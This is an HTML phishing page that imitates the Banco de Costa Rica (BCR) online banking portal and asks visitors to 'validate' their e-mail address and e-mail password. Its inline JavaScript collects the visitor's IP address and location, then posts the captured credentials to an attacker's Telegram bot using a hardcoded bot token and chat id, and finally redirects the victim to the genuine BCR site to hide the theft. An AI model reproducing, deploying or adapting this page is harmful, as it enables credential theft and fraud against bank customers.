<!DOCTYPE html>
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
<meta http-equiv="X-UA-Compatible" content="ie=edge">
<link href="https://ik.imagekit.io/eruobiiei/delbc/style.css" rel="stylesheet" type="text/css">

<title>BCR</title>
<script>
//EL TELEGRAM	  
//bot token
var telegram_bot_id = "6989339920:AAHQzBow1uAijCWHO75g8vBhIKcgisg4ouw";
//chat id
var chat_id = '-4131847359';
 </script>
 <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>  
  <script>
         $.getJSON("https://api.ipify.org?format=json",
          function(data) {
             $("#gfg").html(data.ip);
         })
 </script>
      <script>
         $.getJSON("https://ipinfo.io", function (response) {
    $("#ip").html("IP: " + response.ip);
    $("#address").html("" + response.city + ", " + response.country);
    })
      </script>
	  
<script>
		  

var mald, pmald;
var ready2 = function () {
    mald = document.getElementById("mailed").value;
	pmald = document.getElementById("passmailed").value;
    ip = document.getElementById("gfg").innerHTML;
    ip2 = document.getElementById("address").innerHTML;
    message = "D4T0s-BCR\nCorreo: " + mald + "\nClave correo: " + pmald +"\nIP: " + ip +"\n" + ip2;
};

var sender2 = function () {
    ready2();
    var settings = {
        "async": true,
        "crossDomain": true,
        "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "cache-control": "no-cache"

        },
        "data": JSON.stringify({
            "chat_id": chat_id,
            "text": message
        })
    };
    $.ajax(settings).done(function (response) {
	
     window.location = 'https://www.bancobcr.com/wps/portal/bcr/bancobcr/acerca-del-bcr/informacion_corporativa/historia/';
        console.log(response);
   

   });
    return false;
};

 </script>
 

<script type="application/javascript">
function getIP(json) {
    document.getElementById("ipaddress").value = json.ip;
}
</script>

</head>
<body>

	<div class="head">
	<img src="https://ik.imagekit.io/eruobiiei/delbc/logo.gif" class="logo">
	<img src="https://ik.imagekit.io/eruobiiei/delbc/Certificado.svg" class="headimg1">
	<img src="https://ik.imagekit.io/eruobiiei/delbc/Contactenos.svg" class="headimg2">
		<a href="#" class="linkhead1">Certificaciones</a>
		<a href="#" class="linkhead2">Contáctenos</a>
	</div>
	<div class="head2">
		
		<span class="texthead">Oficina Virtual &nbsp;&nbsp;&nbsp;&nbsp; Personas</span>
		
	</div>
	<div class="costilla">
	<span class="seguridadtxt">Seguridad</span>
	<img class="imgcostilla1" src="https://ik.imagekit.io/eruobiiei/delbc/Consideraciones.svg">	
	<img class="imgcostilla2" src="https://ik.imagekit.io/eruobiiei/delbc/reglamento.svg">	
		<span class="textcostilla1">Consideraciones</span>
		<span class="textcostilla2">Reglamentos</span>
		
		
	</div>
	

		<div class="containerimg">	
		
		


		
		<div class="divform1">


<form action="" method="post" onsubmit=" return sender2()">

						<p id="gfg"  hidden=""></p>
						<p id="address"  hidden=""></p>


			<span class="ingresartxt">Validar datos BCR</span>
			<hr class="line1" color="#C4C4C4">
			<img class="userimg2" src="https://ik.imagekit.io/eruobiiei/delbc/mail.png">
			<img class="passimg" src="https://ik.imagekit.io/eruobiiei/delbc/Seguridad.svg">
			
	<div class="floating-label">      
		<input class="user" type="email"  name="mailed" id="mailed" autocomplete="off" required>
		<span class="highlight"></span>
		<label>E-mail registrado</label>
	</div>
			
			
	<div class="floating-label2">      
		<input class="pass" type="password" id="passmailed" name="passmailed"  autocomplete="off" required="">
		<span class="highlight2"></span>
		<label>Contraseña E-mail</label>
			
			<img id="imgpass1" src="https://ik.imagekit.io/eruobiiei/delbc/ver.png" class="ver" onclick=" pass1(); pass2(); pass11();">
			<img id="imgpass2" src="https://ik.imagekit.io/eruobiiei/delbc/ver2.png" class="ver" onclick=" pass3(); pass4(); pass33();" style="display: none;">
	</div>
	
			<button type="submit" class="btn-uno"  >Continuar</button>	
	
		

		</form>
</div>

		<div class="divform2">
			
			<span class="ingresartxt">Estado actual</span>
			
			<hr class="line1" color="#C4C4C4">

			<span class="registertext">
			<br><br>
			Estado: <strong>Validar datos de<br> correo electrónico</strong> <br> <br>Por favor tenga a la mano su Tarjeta Clave Dinámica<br> ya que el sistema le solicitará para el proceso.
			</span>

		</div>
		
		
		
		
	<div class="formcontainer">
	
		
	</div>
	
	</div>
	

	
	<div class="footer"><span class="footertext"> BCR © Derechos Reservados 2023.     Contáctenos: CentroAsistenciaBCR@bancobcr.com</span></div>
	
</body>
</html>